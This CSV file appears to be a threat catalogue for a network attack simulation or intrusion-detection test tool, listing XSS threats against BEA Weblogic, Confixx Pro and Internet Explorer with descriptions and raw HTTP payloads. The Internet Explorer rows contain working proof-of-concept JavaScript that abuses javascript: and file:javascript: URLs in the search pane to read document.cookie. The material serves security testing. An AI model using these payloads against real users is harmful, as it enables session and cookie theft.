XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿BEAWeblogic_XSS.xml,BEA Weblogic XSS,This threat takes advantage of a Cross-Site Scripting attack on BEA's Weblogic Administration Console.  This can be used for stealing cookies and authentication information.  The BEA Administration Console typically listens on port 8001.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿BEAWeblogic_XSS_IPv6.xml,BEA Weblogic XSS (IPv6 Version),This threat takes advantage of a Cross-Site Scripting attack on BEA's Weblogic Administration Console.  This can be used for stealing cookies and authentication information.  The BEA Administration Console typically listens on port 8001. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿Confixxpro_XSS.xml,Confixx Pro ftplogin login Variable XSS,"Confixx Pro contains a flaw that allows a remote cross site scripting attack. This flaw exists because the application does not validate the ""login"" variable upon submission to the ftplogin/ script. This could allow a user to create a specially crafted URL that would execute arbitrary code in a user's browser. ConfixxPro  is a web application, and typically listens on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿Confixxpro_XSS_IPv6.xml,Confixx Pro ftplogin login Variable XSS (IPv6 Version),"Confixx Pro contains a flaw that allows a remote cross site scripting attack. This flaw exists because the application does not validate the ""login"" variable upon submission to the ftplogin/ script. This could allow a user to create a specially crafted URL that would execute arbitrary code in a user's browser. ConfixxPro  is a web application, and typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿InternetExplorerHistoryXSS.xml,Internet Explorer History XSS Attack,This threat causes a XSS event to occur in the history bar of Internet Explorer.  This allows a user to inject arbitrary commands and steal sensitive user data.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,GET / HTTP/1.0[[0D 0A 0D 0A]]
InternetExplorerHistoryXSS.xml,Internet Explorer History XSS Attack,This threat causes a XSS event to occur in the history bar of Internet Explorer.  This allows a user to inject arbitrary commands and steal sensitive user data.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Tue, 29 Mar 2005 19:14:11 GMT[[0D 0A ]]Server: Apache/2.0.40 (Red Hat Linux)[[0D 0A ]]Last-Modified: Tue, 29 Mar 2005 19:14:00 GMT[[0D 0A ]]ETag: ""47e76-25a-76822e00""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 602[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A 0D 0A ]]<p><font size=""7"">RefBack-MyPage</font></p>[[0D 0A ]]<p><font size=""6""><font size=""2""><b><i>Created by <a href=""http://clik.to/liudieyu"">LiuDieYu</a> [[0D 0A ]]  at <a href=""http://umbrella.mx.tc"">UMBRELLA.MX.TC</a> </i></b></font></font></p>[[0D 0A ]]<SCRIPT>[[0D 0A ]]VtPage=""http://www.google.com/"";[[0D 0A 0D 0A ]]w=window.open(""javascript:alert('JPU: \\n document.cookie = \\n'+document.cookie)\;window.opener.Ref=history.back;"",""_search"");[[0D 0A ]]alert(""wait until the JPU is executed."");[[0D 0A ]]alert(""[winMain].Ref = \n"" + Ref);[[0D 0A 0D 0A ]]w=window.open(VtPage,""_search"");[[0D 0A ]]alert(""wait for VtPage"");[[0D 0A ]]Ref();[[0D 0A ]]alert(""MISSION COMPLETED."");[[0D 0A 0D 0A 0D 0A 0D 0A 0D 0A ]]</SCRIPT>"
﻿InternetExplorerHistoryXSS_IPv6.xml,Internet Explorer History XSS Attack (IPv6 Version),This threat causes a XSS event to occur in the history bar of Internet Explorer.  This allows a user to inject arbitrary commands and steal sensitive user data.  This threat is a client attack that comes from the virtual server. (IPv6 Version),HTTP/IPv6,TCP,GET / HTTP/1.0[[0D 0A 0D 0A]]
InternetExplorerHistoryXSS_IPv6.xml,Internet Explorer History XSS Attack (IPv6 Version),This threat causes a XSS event to occur in the history bar of Internet Explorer.  This allows a user to inject arbitrary commands and steal sensitive user data.  This threat is a client attack that comes from the virtual server. (IPv6 Version),HTTP/IPv6,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Tue, 29 Mar 2005 19:14:11 GMT[[0D 0A ]]Server: Apache/2.0.40 (Red Hat Linux)[[0D 0A ]]Last-Modified: Tue, 29 Mar 2005 19:14:00 GMT[[0D 0A ]]ETag: ""47e76-25a-76822e00""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 602[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A 0D 0A ]]<p><font size=""7"">RefBack-MyPage</font></p>[[0D 0A ]]<p><font size=""6""><font size=""2""><b><i>Created by <a href=""http://clik.to/liudieyu"">LiuDieYu</a> [[0D 0A ]]  at <a href=""http://umbrella.mx.tc"">UMBRELLA.MX.TC</a> </i></b></font></font></p>[[0D 0A ]]<SCRIPT>[[0D 0A ]]VtPage=""http://www.google.com/"";[[0D 0A 0D 0A ]]w=window.open(""javascript:alert('JPU: \\n document.cookie = \\n'+document.cookie)\;window.opener.Ref=history.back;"",""_search"");[[0D 0A ]]alert(""wait until the JPU is executed."");[[0D 0A ]]alert(""[winMain].Ref = \n"" + Ref);[[0D 0A 0D 0A ]]w=window.open(VtPage,""_search"");[[0D 0A ]]alert(""wait for VtPage"");[[0D 0A ]]Ref();[[0D 0A ]]alert(""MISSION COMPLETED."");[[0D 0A 0D 0A 0D 0A 0D 0A 0D 0A ]]</SCRIPT>"
﻿InternetExplorerSearchXSS.xml,Internet Explorer XSS Injection Through Searchbar,"This threat attempts to insert Javascript into the search bar, causing code to be executed with full rights of the user.  Can be used to steal user data or run arbitrary programs.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,GET / HTTP/1.0[[0D 0A 0D 0A]]
InternetExplorerSearchXSS.xml,Internet Explorer XSS Injection Through Searchbar,"This threat attempts to insert Javascript into the search bar, causing code to be executed with full rights of the user.  Can be used to steal user data or run arbitrary programs.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Tue, 29 Mar 2005 18:51:35 GMT[[0D 0A ]]Server: Apache/2.0.40 (Red Hat Linux)[[0D 0A ]]Last-Modified: Tue, 29 Mar 2005 18:51:13 GMT[[0D 0A ]]ETag: ""47e76-1d5-25076a40""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 469[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]<html><head></head>[[0A ]]<body><p><font size=""7"">WsOpenFileJPU-MyPage</font></p>[[0A ]]<p><font size=""6""><font size=""2""><b><i>Created by <a href=""http://clik.to/liudieyu"">LiuDieYu</a> [[0A ]]  at <a href=""http://umbrella.mx.tc/"">UMBRELLA.MX.TC</a> </i></b></font></font></p>[[0A ]]<script>[[0A ]]VtUrl=""http://www.google.com/"";[[0A ]]window.open(VtUrl,""_search"");[[0A ]]alert(""wait for VtUrl in Ws"");[[0A ]]window.open(""file:javascript:alert('document.cookie = '+document.cookie)"",""_search"");[[0A ]]</script></body></html>"
